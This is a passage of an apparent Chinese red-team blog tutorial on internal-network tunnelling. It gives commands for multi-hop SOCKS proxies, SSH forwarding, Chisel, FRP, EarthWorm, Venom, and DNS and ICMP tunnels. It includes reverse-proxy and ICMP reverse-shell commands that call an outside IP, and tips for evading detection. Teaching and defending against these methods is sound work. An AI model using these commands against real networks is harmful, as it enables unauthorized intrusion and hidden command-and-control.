+<p><strong>第四步：查看节点拓扑</strong></p>
+<p>在 Admin 端执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 返回主菜单</span></span><br><span class="line">back</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看所有节点</span></span><br><span class="line">detail</span><br></pre></td></tr></table></figure>
+
+<p><strong>输出示例</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Node 0: 192.168.158.132 (Active)</span><br><span class="line">  └─ Node 1: 192.168.158.144 (Active)</span><br></pre></td></tr></table></figure>
+
+<p><strong>第五步：在跳板机 B 上启动 Socks 代理</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 选择节点 1（跳板机 B）</span></span><br><span class="line">use 1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动 Socks5 代理（端口 6677）</span></span><br><span class="line">socks 6677</span><br></pre></td></tr></table></figure>
+
+<p><strong>第六步：配置代理</strong></p>
+<p>在 Proxifier 或 Proxychains 中配置：</p>
+<ul>
+<li>代理地址：<code>127.0.0.1:6677</code></li>
+<li>代理类型：Socks5</li>
+</ul>
+<p><img src="/suidao/12.webp" loading='lazy'></p>
+<p><strong>第七步：访问深层内网</strong></p>
+<p>现在可以通过代理访问 192.168.3.12：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 Proxychains</span></span><br><span class="line">proxychains nmap -sT 192.168.3.12</span><br><span class="line">proxychains ssh root@192.168.3.12</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="多级代理的优势"><a href="#多级代理的优势" class="headerlink" title="多级代理的优势"></a>多级代理的优势</h2><ol>
+<li><strong>突破网络隔离</strong>：可以访问多层内网中的目标</li>
+<li><strong>分散流量特征</strong>：流量经过多个跳板，难以溯源</li>
+<li><strong>灵活的路径选择</strong>：可以根据网络拓扑选择最优路径</li>
+<li><strong>容错能力</strong>：某个节点失效后可以切换到其他路径</li>
+</ol>
+<hr>
+<h1 id="其他隧道工具"><a href="#其他隧道工具" class="headerlink" title="其他隧道工具"></a>其他隧道工具</h1><h2 id="SSH-隧道"><a href="#SSH-隧道" class="headerlink" title="SSH 隧道"></a>SSH 隧道</h2><h3 id="本地端口转发"><a href="#本地端口转发" class="headerlink" title="本地端口转发"></a>本地端口转发</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将远程 3389 端口转发到本地 3389</span></span><br><span class="line">ssh -L 3389:192.168.3.10:3389 user@jump-server.com</span><br></pre></td></tr></table></figure>
+
+<h3 id="远程端口转发"><a href="#远程端口转发" class="headerlink" title="远程端口转发"></a>远程端口转发</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将本地 80 端口转发到远程 8080</span></span><br><span class="line">ssh -R 8080:127.0.0.1:80 user@jump-server.com</span><br></pre></td></tr></table></figure>
+
+<h3 id="动态端口转发（Socks-代理）"><a href="#动态端口转发（Socks-代理）" class="headerlink" title="动态端口转发（Socks 代理）"></a>动态端口转发（Socks 代理）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在本地 1080 端口启动 Socks5 代理</span></span><br><span class="line">ssh -D 1080 user@jump-server.com</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Chisel"><a href="#Chisel" class="headerlink" title="Chisel"></a>Chisel</h2><p>Chisel 是一款基于 HTTP 的快速 TCP&#x2F;UDP 隧道工具。</p>
+<p><strong>服务端</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./chisel server -p 8080 --reverse</span><br></pre></td></tr></table></figure>
+
+<p><strong>客户端</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 反向 Socks 代理</span></span><br><span class="line">./chisel client http://1.95.47.217:8080 R:socks</span><br><span class="line"></span><br><span class="line"><span class="comment"># 反向端口转发</span></span><br><span class="line">./chisel client http://1.95.47.217:8080 R:3389:192.168.3.10:3389</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="FRP"><a href="#FRP" class="headerlink" title="FRP"></a>FRP</h2><p>FRP（Fast Reverse Proxy）是一款高性能的反向代理工具。</p>
+<p><strong>服务端配置</strong>（frps.ini）：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">bind_port</span> = <span class="number">7000</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>客户端配置</strong>（frpc.ini）：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = <span class="number">1.95</span>.<span class="number">47.217</span></span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span></span><br><span class="line"></span><br><span class="line"><span class="section">[socks5]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">1080</span></span><br><span class="line"><span class="attr">plugin</span> = socks5</span><br></pre></td></tr></table></figure>
+
+<p><strong>启动</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 服务端</span></span><br><span class="line">./frps -c frps.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># 客户端</span></span><br><span class="line">./frpc -c frpc.ini</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="EarthWorm（EW）"><a href="#EarthWorm（EW）" class="headerlink" title="EarthWorm（EW）"></a>EarthWorm（EW）</h2><p>EarthWorm 是一款经典的内网穿透工具。</p>
+<p><strong>反向 Socks 代理</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 服务端</span></span><br><span class="line">./ew_linux_x64 -s rcsocks -l 1080 -e 8888</span><br><span class="line"></span><br><span class="line"><span class="comment"># 客户端</span></span><br><span class="line">./ew_linux_x64 -s rssocks -d 1.95.47.217 -e 8888</span><br></pre></td></tr></table></figure>
+
+<p><strong>多级代理</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 服务端</span></span><br><span class="line">./ew_linux_x64 -s lcx_listen -l 1080 -e 8888</span><br><span class="line"></span><br><span class="line"><span class="comment"># 跳板机</span></span><br><span class="line">./ew_linux_x64 -s lcx_slave -d 1.95.47.217 -e 8888 -f 192.168.3.10 -g 9999</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标机器</span></span><br><span class="line">./ew_linux_x64 -s ssocksd -l 9999</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Venom"><a href="#Venom" class="headerlink" title="Venom"></a>Venom</h2><p>Venom 是一款多级代理工具，支持多种协议。</p>
+<p><strong>服务端</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./admin_linux_x64 -lport 9999</span><br></pre></td></tr></table></figure>
+
+<p><strong>客户端</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./agent_linux_x64 -rhost 1.95.47.217 -rport 9999</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="DNS-隧道"><a href="#DNS-隧道" class="headerlink" title="DNS 隧道"></a>DNS 隧道</h1><h2 id="Dnscat2"><a href="#Dnscat2" class="headerlink" title="Dnscat2"></a>Dnscat2</h2><p>Dnscat2 通过 DNS 协议建立加密隧道，适合严格的网络环境。</p>
+<p><strong>服务端</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby dnscat2.rb --dns <span class="string">&quot;domain=tunnel.example.com,host=0.0.0.0,port=53&quot;</span> --secret=password123</span><br></pre></td></tr></table></figure>
+
+<p><strong>客户端</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./dnscat --secret=password123 tunnel.example.com</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Iodine"><a href="#Iodine" class="headerlink" title="Iodine"></a>Iodine</h2><p>Iodine 通过 DNS 协议传输 IP 流量。</p>
+<p><strong>服务端</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iodined -f -c -P password123 10.0.0.1 tunnel.example.com</span><br></pre></td></tr></table></figure>
+
+<p><strong>客户端</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iodine -f -P password123 tunnel.example.com</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="ICMP-隧道"><a href="#ICMP-隧道" class="headerlink" title="ICMP 隧道"></a>ICMP 隧道</h1><h2 id="Icmpsh"><a href="#Icmpsh" class="headerlink" title="Icmpsh"></a>Icmpsh</h2><p>Icmpsh 通过 ICMP 协议建立反向 Shell。</p>
+<p><strong>服务端</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python icmpsh_m.py 1.95.47.217 192.168.3.10</span><br></pre></td></tr></table></figure>
+
+<p><strong>客户端</strong>：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icmpsh.exe -t <span class="number">1</span>.<span class="number">95</span>.<span class="number">47</span>.<span class="number">217</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="隧道技术对抗"><a href="#隧道技术对抗" class="headerlink" title="隧道技术对抗"></a>隧道技术对抗</h1><h2 id="蓝队检测"><a href="#蓝队检测" class="headerlink" title="蓝队检测"></a>蓝队检测</h2><p><strong>1. 流量分析</strong>：</p>
+<ul>
+<li>监控异常的 DNS 查询（高频、长域名）</li>
+<li>检测 ICMP 流量中的异常数据</li>
+<li>分析 HTTP 流量中的隧道特征</li>
+</ul>
+<p><strong>2. 行为分析</strong>：</p>
+<ul>
+<li>监控异常的网络连接（非标准端口）</li>
+<li>检测长时间的持久连接</li>
+<li>分析进程的网络行为</li>
+</ul>
+<p><strong>3. 文件检测</strong>：</p>
+<ul>
+<li>扫描 Web 目录中的可疑脚本</li>
+<li>检测隧道工具的文件特征</li>
+<li>监控文件上传行为</li>
+</ul>
+<hr>
+<h2 id="红队规避"><a href="#红队规避" class="headerlink" title="红队规避"></a>红队规避</h2><p><strong>1. 协议伪装</strong>：</p>
+<ul>
+<li>使用 HTTPS 加密隧道流量</li>
+<li>伪装成正常的 Web 流量</li>
+<li>使用 CDN 隐藏真实 C2 地址</li>
+</ul>
+<p><strong>2. 流量混淆</strong>：</p>
+<ul>
+<li>添加随机延迟和抖动</li>
+<li>限制流量速率</li>
+<li>模拟正常用户行为</li>
+</ul>
+<p><strong>3. 多通道冗余</strong>：</p>
+<ul>
+<li>同时建立多个隧道（HTTP、DNS、ICMP）</li>
+<li>动态切换通信通道</li>
+<li>使用域前置技术</li>
+</ul>
+<p><strong>4. 内存执行</strong>：</p>
+<ul>
+<li>使用无文件的隧道工具</li>
+<li>通过反射加载执行</li>
+<li>避免在磁盘留下痕迹</li>
+</ul>
+<hr>
+<h1 id="隧道工具选择建议"><a href="#隧道工具选择建议" class="headerlink" title="隧道工具选择建议"></a>隧道工具选择建议</h1><table>
+<thead>
+<tr>
+<th>场景</th>
+<th>推荐工具</th>
+<th>原因</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>目标可出网</td>
+<td>Stowaway, Chisel</td>
+<td>功能强大，支持多级代理</td>
+</tr>
+<tr>
+<td>目标不出网</td>
+<td>Neo-reGeorg, Tunna</td>
+<td>通过 WebShell 建立隧道</td>
+</tr>
+<tr>
+<td>严格网络环境</td>
+<td>Dnscat2, Iodine</td>
+<td>使用 DNS 协议绕过限制</td>
+</tr>
+<tr>
+<td>需要高性能</td>
+<td>FRP, Chisel</td>
+<td>传输速度快，稳定性高</td>
+</tr>
+<tr>
+<td>需要隐蔽性</td>
+<td>SSH 隧道, HTTPS 隧道</td>
+<td>流量加密，难以检测</td>
+</tr>
+</tbody></table>
+<hr>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>内网隧道技术是内网渗透的核心技能，成功的隧道建立依赖于：</p>
+<ol>
+<li><p><strong>网络拓扑分析</strong>：</p>
+<ul>
+<li>识别网络边界和隔离区域</li>
+<li>确定跳板机的位置</li>
+<li>规划最优的代理路径</li>
+</ul>
+</li>
+<li><p><strong>工具选择</strong>：</p>
+<ul>
+<li>根据目标环境选择合适的隧道工具</li>
+<li>考虑稳定性、速度和隐蔽性</li>
+<li>准备多种备用方案</li>
+</ul>
+</li>
+<li><p><strong>隐蔽性优化</strong>：</p>
+<ul>
+<li>使用加密协议传输流量</li>
+<li>限制流量速率避免异常</li>
+<li>伪装成正常的业务流量</li>
+</ul>
+</li>
+<li><p><strong>稳定性保障</strong>：</p>
+<ul>
+<li>配置自动重连机制</li>
+<li>建立多条冗余通道</li>
+<li>定期测试隧道可用性</li>
+</ul>
+</li>
+</ol>
+<p>记住：隧道技术需要在授权的渗透测试环境中使用，未经授权的隧道建立属于违法行为。</p>
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a><a class="post-meta__tags" href="/tags/%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/">隧道技术</a></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2026/02/13/fish/" title="钓鱼攻击与木马投递技术"><img class="cover" src="/img/covers/shinchan-cover-11.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post" loading='lazy'><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">钓鱼攻击与木马投递技术</div></div><div class="info-2"><div class="info-item-1">钓鱼攻击概述钓鱼攻击是社会工程学的核心技术，通过伪装成可信的实体（如同事、IT 部门、合作伙伴）诱导目标执行恶意操作。在红队行动中，钓鱼攻击通常是获取初始访问权限的最有效方式。 钓鱼攻击的优势：  绕过边界防护：不需要直接攻击防火墙或 WAF 利用人性弱点：目标是人而非技术系统 成功率高：精心设计的钓鱼邮件成功率可达 30%+ 难以防御：技术手段难以完全阻止社会工程学攻击  常见的钓鱼场景：  邮件钓鱼：伪装成公司通知、HR 邮件、合作伙伴邮件 水坑攻击：在目标经常访问的网站植入恶意代码 USB 投递：在目标公司附近投放带有恶意程序的 U 盘 钓鱼网站：克隆登录页面窃取凭证   钓鱼基础设施搭建Gophish 平台部署Gophish 介绍Gophish 是一款开源的钓鱼攻击模拟平台，支持：  邮件模板管理：创建和管理钓鱼邮件模板 目标用户管理：批量导入和管理目标用户 钓鱼页面托管：托管伪造的登录页面 数据统计：实时跟踪邮件打开率、点击率、凭证提交率  项目地址： 1https://github.com/gophish/gophish   使用 Docker 部署第一步：安装 Do...</div></div></div></a><a class="pagination-related" href="/2026/02/13/exchange/" title="Exchange 后渗透利用"><img class="cover" src="/img/covers/shinchan-cover-10.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post" loading='lazy'><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">Exchange 后渗透利用</div></div><div class="info-2"><div class="info-item-1">Exchange 在内网中的价值Exchange Server 是企业内网中的核心邮件系统，通常包含大量敏感信息：  通讯录数据：完整的组织架构和员工联系方式 邮件内容：可能包含密码、VPN 凭证、系统文档 高权限账户：Exchange 管理员通常拥有域内高权限 横向跳板：Exchange 服务器通常可以访问多个内网区域  在获取域内普通用户权限后，定位并利用 Exchange 服务器是提升权限和扩大战果的关键步骤。  域内定位 ExchangeSPN 定位 Exchange原理SPN（Service Principal Name）是 Kerberos 认证中用于标识服务的唯一标识符。Exchange 服务器会在域内注册多个 SPN，通过查询 SPN 可以快速定位 Exchange 服务器。 实战操作1. 查询域内所有 SPN： 1setspn -T 0day.org -q */*   参数说明：  -T：指定域名 -q */*：查询所有 SPN  2. 过滤 Exchange 相关 SPN： 1setspn -T 0day.org -q */* | findstr &quot;...</div></div></div></a></nav></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By Kenny</span></div><div class="footer_custom_text"><div class="footer-links"><a class="footer-link" href="https://yyyxxx.cc" target="_blank" rel="noopener noreferrer">友情链接：映雪安全</a><a class="footer-link" href="https://qm.qq.com/q/QNgesnj1aU" target="_blank" rel="noopener noreferrer">QQ群：点击加群</a></div></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"></div><div id="rightside-config-show"><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.4"></script><script src="/js/main.js?v=5.5.4"></script><div class="js-pjax"></div></div></body></html>
